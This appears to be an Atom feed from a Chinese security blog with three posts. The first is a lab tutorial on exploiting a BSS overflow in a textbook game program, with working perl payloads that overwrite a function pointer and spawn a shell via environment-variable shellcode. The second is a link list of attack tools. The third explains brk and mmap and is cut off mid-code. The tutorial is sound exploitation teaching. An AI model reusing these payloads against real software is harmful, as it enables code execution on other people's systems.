<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0rk&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kevien.github.io/"/>
  <updated>2018-03-21T17:55:41.000Z</updated>
  <id>http://kevien.github.io/</id>
  
  <author>
    <name>M0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BSS段的溢出攻击</title>
    <link href="http://kevien.github.io/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://kevien.github.io/2018/03/22/BSS段的溢出攻击/</id>
    <published>2018-03-21T17:30:17.000Z</published>
    <updated>2018-03-21T17:55:41.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>，还有一种发生在bss节区上的，bss属于数据节区的一种，通常用来保存未初始化的静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="external">wiki</a></li>
<li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
<li><p>from game_of_chance.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Custom user struct to store information about users </div><div class="line">struct user &#123;</div><div class="line">    int uid;</div><div class="line">    int credits;</div><div class="line">    int highscore;</div><div class="line">    char name[100];</div><div class="line">    int (*current_game) ();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">...</div><div class="line">struct user player;     // Player struct</div></pre></td></tr></table></figure>
</li>
<li><p>其中game_of_chance 是如下图的一个游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p>
</li>
<li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void input_name() &#123;</div><div class="line">   char *name_ptr, input_char=&apos;\n&apos;;</div><div class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</div><div class="line">   </div><div class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</div><div class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</div><div class="line">      *name_ptr = input_char;   // Put the input char into name field.</div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</div><div class="line">      name_ptr++;               // Increment the name pointer.</div><div class="line">   &#125;</div><div class="line">   *name_ptr = 0;  // Terminate the string.</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>这个函数会接收用户输入的名字直到用户输入换行符，所以这里并没有有效的限制用户输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行，代码片段如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if((choice &lt; 1) || (choice &gt; 7))</div><div class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</div><div class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</div><div class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</div><div class="line">             if(choice == 1)        // then point it at the selected game </div><div class="line">                player.current_game = pick_a_number;   </div><div class="line">             else if(choice == 2)                     </div><div class="line">                player.current_game = dealer_no_match;</div><div class="line">             else</div><div class="line">                player.current_game = find_the_ace;</div><div class="line">             last_game = choice;   // and set last_game.</div><div class="line">          &#125;</div><div class="line">          play_the_game();   // Play the game.</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
</li>
<li><p>如果last_game 和当前的选择不一致，函数指针current_game 会被设置成当前的选择，意味着要程序去调用函数指针，就需要首先设置last_game这个变量。<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></p>
</li>
<li>我们可以通过ctrl+z挂起当前的进程，这个时候，last_game变量被设置成了1(因为刚才玩的是游戏1)，这个时候就可以进入if后面的判断了，我们找到了可以被溢出的变量name，然后让我们通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li>
<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p>
<ul>
<li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做不可描述的事情。</li>
<li>nm命令可以查看程序的符号表，我们来看一下程序有哪些函数以及其对应的内存地址（此思路常用语破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li>
<li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li>
<li><p>这个程序通过标准输入进行用户交互，我们完全可以实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
</li>
<li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 90 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 11</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 80 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048ca5</div><div class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</div><div class="line">You have won the jackpot of 100 credits!</div><div class="line"></div><div class="line">You now have 180 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 180 credits] -&gt;  </div><div class="line">Thanks for playing! Bye.</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</div></pre></td></tr></table></figure>
</li>
<li><p>可以看到我们函数被调用我们增加了100金币</p>
</li>
<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p>
<ul>
<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载系统变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</div><div class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</div><div class="line">                                                          XQh//shh/bin��Q��S��̀</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</div><div class="line">SHELLCODE will be at 0xbffff206</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1260 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 6</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 1250 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0xbffff206</div><div class="line">id</div><div class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/bssexploit" target="_blank" rel="external">github</a></p>
<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
<li>《Hacking the art of exploitation》0x342</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;缓冲区溢出除了典型的&lt;a href=&quot;https://kevien.github.io/2017/08/
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180319安全动态</title>
    <link href="http://kevien.github.io/2018/03/19/20180319%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/19/20180319安全动态/</id>
    <published>2018-03-19T05:17:36.000Z</published>
    <updated>2018-03-21T08:22:05.961Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>使用 Sysmon 和 Splunk 进行高级事件检测与威胁追查，来自 BotConf2016<br><a href="https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf" target="_blank" rel="external">https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf</a></li>
<li>RDP 劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话以实现横向渗透<br><a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#104;&#116;&#116;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#101;&#100;&#105;&#117;&#109;&#46;&#99;&#111;&#x6d;&#47;&#64;&#x6e;&#x65;&#116;&#x77;&#x6f;&#x72;&#x6b;&#x73;&#101;&#x63;&#x75;&#x72;&#x69;&#116;&#121;&#x2f;&#114;&#x64;&#112;&#45;&#x68;&#x69;&#x6a;&#97;&#x63;&#x6b;&#x69;&#110;&#103;&#x2d;&#104;&#x6f;&#119;&#45;&#116;&#x6f;&#x2d;&#104;&#x69;&#106;&#97;&#x63;&#x6b;&#x2d;&#x72;&#100;&#115;&#45;&#x61;&#x6e;&#100;&#x2d;&#x72;&#101;&#109;&#x6f;&#x74;&#x65;&#97;&#x70;&#x70;&#x2d;&#x73;&#101;&#115;&#115;&#x69;&#x6f;&#110;&#x73;&#45;&#x74;&#114;&#97;&#110;&#115;&#x70;&#x61;&#114;&#x65;&#110;&#116;&#108;&#x79;&#45;&#116;&#x6f;&#x2d;&#x6d;&#x6f;&#x76;&#101;&#45;&#x74;&#104;&#x72;&#111;&#117;&#103;&#x68;&#x2d;&#97;&#110;&#x2d;&#100;&#97;&#x32;&#97;&#x31;&#101;&#55;&#x33;&#x61;&#53;&#x66;&#54;">&#104;&#116;&#116;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#101;&#100;&#105;&#117;&#109;&#46;&#99;&#111;&#x6d;&#47;&#64;&#x6e;&#x65;&#116;&#x77;&#x6f;&#x72;&#x6b;&#x73;&#101;&#x63;&#x75;&#x72;&#x69;&#116;&#121;&#x2f;&#114;&#x64;&#112;&#45;&#x68;&#x69;&#x6a;&#97;&#x63;&#x6b;&#x69;&#110;&#103;&#x2d;&#104;&#x6f;&#119;&#45;&#116;&#x6f;&#x2d;&#104;&#x69;&#106;&#97;&#x63;&#x6b;&#x2d;&#x72;&#100;&#115;&#45;&#x61;&#x6e;&#100;&#x2d;&#x72;&#101;&#109;&#x6f;&#x74;&#x65;&#97;&#x70;&#x70;&#x2d;&#x73;&#101;&#115;&#115;&#x69;&#x6f;&#110;&#x73;&#45;&#x74;&#114;&#97;&#110;&#115;&#x70;&#x61;&#114;&#x65;&#110;&#116;&#108;&#x79;&#45;&#116;&#x6f;&#x2d;&#x6d;&#x6f;&#x76;&#101;&#45;&#x74;&#104;&#x72;&#111;&#117;&#103;&#x68;&#x2d;&#97;&#110;&#x2d;&#100;&#97;&#x32;&#97;&#x31;&#101;&#55;&#x33;&#x61;&#53;&#x66;&#54;</a></li>
<li>Protecting Against HSTS Abuse<br><a href="https://webkit.org/blog/8146/protecting-against-hsts-abuse/" target="_blank" rel="external">https://webkit.org/blog/8146/protecting-against-hsts-abuse/</a></li>
<li>Tokenvator - 操作 Windows Tokens 进行提权的工具<br><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="external">https://github.com/0xbadjuju/Tokenvator</a></li>
<li>Defending Microsoft environments at scale，大规模 Microsoft 环境的防御方案<br><a href="https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view" target="_blank" rel="external">https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view</a></li>
<li>go-fuzz 使用指南，来自 GopherConRu 18 大会<br><a href="https://go-talks.appspot.com/github.com/dvyukov/go-fuzz/slides/fuzzing.slide" target="_blank" rel="external">https://go-talks.appspot.com/github.com/dvyukov/go-fuzz/slides/fuzzing.slide</a></li>
<li>十种进程注入技术介绍<br><a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="external">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></li>
<li>Internal-Monologue - 在不触碰 LSASS 的情况下抓取 NTLM Hashes 的攻击方式<br><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="external">https://github.com/eladshamir/Internal-Monologue</a></li>
<li>滥用 LAPS 实现持久化控制<br><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="external">https://rastamouse.me/2018/03/laps---part-2/</a></li>
<li>Pwn a ARM Router Step by Step<br><a href="https://xianzhi.aliyun.com/forum/topic/2184" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/2184</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;使用 Sysmon 和 Splunk 进行高级事件检测与威胁追查，来自 BotConf2016&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>malloc的系统调用</title>
    <link href="http://kevien.github.io/2018/03/18/malloc%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>http://kevien.github.io/2018/03/18/malloc的系统调用/</id>
    <published>2018-03-17T17:27:46.000Z</published>
    <updated>2018-03-19T04:52:22.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>和<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>。<h4 id="prco-pid-maps文件"><a href="#prco-pid-maps文件" class="headerlink" title="/prco/$pid/maps文件"></a>/prco/$pid/maps文件</h4></li>
<li>先来简单看下这个文件，这个文件会显示整个进程的地址空间分布情况。<br><img src="/2018/03/18/malloc的系统调用/maps.png" alt=""><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4></li>
<li>brk从内核获取内存是通过增加程序中断地址方式的，开始于start_brk,结束于brk，初始的时候两者都指向的是同一个位置。</li>
<li>当ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的</li>
<li>当ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。<br><img src="/2018/03/18/malloc的系统调用/linuxFlexibleAddressSpaceLayout.png" alt=""><br>nice pic，ah</li>
<li>如上图虚拟内存地址空间分布图所示，start_brk即是堆空间的开始，brk即是堆空间的结束。</li>
<li><p>!注意，后面的测试均是关闭ASLR后测试输出，此外测试系统使用的是ubuntu14.04.1X64操作系统。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">关闭ASLR的方法</div><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
</li>
<li><p>示例代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">/* sbrk and brk example */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        void *curr_brk, *tmp_brk = NULL;</div><div class="line"></div><div class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</div><div class="line"></div><div class="line">        /* sbrk(0) gives current program break location */</div><div class="line">        tmp_brk = curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* brk(addr) increments/decrements program break location */</div><div class="line">        brk(curr_brk+4096);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        brk(tmp_brk);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>输出分析：</p>
</li>
<li>在brk之前，我们可以看到是没有进程中是没有堆块的，因此 start_brk=brk=end_data=0x602000<br><img src="/2018/03/18/malloc的系统调用/brkbefore.png" alt=""></li>
<li>当程序执行brk调用的时候，如下的输出，我们看到有了堆块,因此 start_brk=end_data=0x602000,此时</li>
<li>start_brk=end_data=0x602000</li>
<li>brk = 0x603000<br><img src="/2018/03/18/malloc的系统调用/brkafter.png" alt=""></li>
<li>解释一下新增加的一行：这里602000-603000就是动态分配的地址空间，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4></li>
<li><p>malloc使用<a href="https://elixir.bootlin.com/linux/v3.8/source/mm/mmap.c#L1285" target="_blank" rel="external">mmap</a>来创建一个私有的匿名映射块，私有的匿名映射块主要的目的就是分配新的内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">/* Private anonymous mapping example using mmap syscall */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void static inline errExit(const char* msg)</div><div class="line">&#123;</div><div class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</div><div class="line">        exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        int ret = -1;</div><div class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</div><div class="line">        printf(&quot;Before mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        char* addr = NULL;</div><div class="line">        addr = 